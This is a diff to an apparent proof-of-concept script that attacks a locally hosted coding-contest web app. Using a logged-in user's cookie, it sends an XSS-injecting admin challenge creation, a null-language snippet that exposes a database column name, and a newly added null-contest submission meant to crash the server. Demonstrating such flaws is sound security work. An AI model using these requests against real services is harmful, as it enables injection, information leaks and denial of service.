@@ -95,7 +95,7 @@ console.log({ futureContestUrl: futureContestEndpoint });
     tests: [{ challenge_id: -1, name: '12', input: '12', output: '12', index: 0 }]
   });
 
-  const res = await fetch(createUrl('/admin/challenges/create'), {
+  await fetch(createUrl('/admin/challenges/create'), {
     credentials: 'include',
     headers: {
       Accept: 'application/json, text/plain, */*',
@@ -113,7 +113,6 @@ console.log({ futureContestUrl: futureContestEndpoint });
     mode: 'cors'
   });
 
-  console.log({ statusText: res.statusText });
   console.log(
     'If the attack is successful, you will see a new challenge called "XSS injected" with an unsafe form'
   );
@@ -142,6 +141,9 @@ const userCookie = await login(userPage);
   );
 }
 
+await userPage.close();
+await userBrowser.close();
+
 // as a normal user, create a snippet with null language leading to exposing an internal column name
 {
   const body = JSON.stringify({
@@ -150,7 +152,7 @@ const userCookie = await login(userPage);
   });
 
   console.log('Exposing a database column name attack');
-  const res = await fetch('http://127.0.0.1:2005/snippets', {
+  const res = await fetch(createUrl('/snippets'), {
     credentials: 'include',
     headers: {
       'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0',
@@ -164,7 +166,6 @@ const userCookie = await login(userPage);
       'Cache-Control': 'no-cache',
       Cookie: userCookie
     },
-    referrer: 'http://127.0.0.1:2005/snippets',
     body,
     method: 'POST',
     mode: 'cors'
@@ -176,5 +177,37 @@ const userCookie = await login(userPage);
   console.log(await res.text());
 }
 
-await userPage.close();
-await userBrowser.close();
+// As a normal user, submit to a contest that does not exist (will cause the server to crash)
+{
+  console.log('DOS attack');
+  const body = JSON.stringify({
+    contest_id: null,
+    language: 'bash',
+    solution: 'asd',
+    explanation: '',
+    language_version: '5.2.0'
+  });
+  try {
+    await fetch(createUrl('/contests/submit'), {
+      credentials: 'include',
+      headers: {
+        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0',
+        Accept: 'application/json, text/plain, */*',
+        'Accept-Language': 'en-US,en;q=0.5',
+        'Sec-Fetch-Dest': 'empty',
+        'Sec-Fetch-Mode': 'no-cors',
+        'Sec-Fetch-Site': 'same-origin',
+        'Content-Type': 'application/json;charset=utf-8',
+        Pragma: 'no-cache',
+        'Cache-Control': 'no-cache',
+        Cookie: userCookie
+      },
+      body,
+      method: 'POST',
+      mode: 'cors'
+    });
+  } catch (e) {
+    console.log({ e });
+  }
+  console.log('If the attack is successful, the server should have crashed');
+}
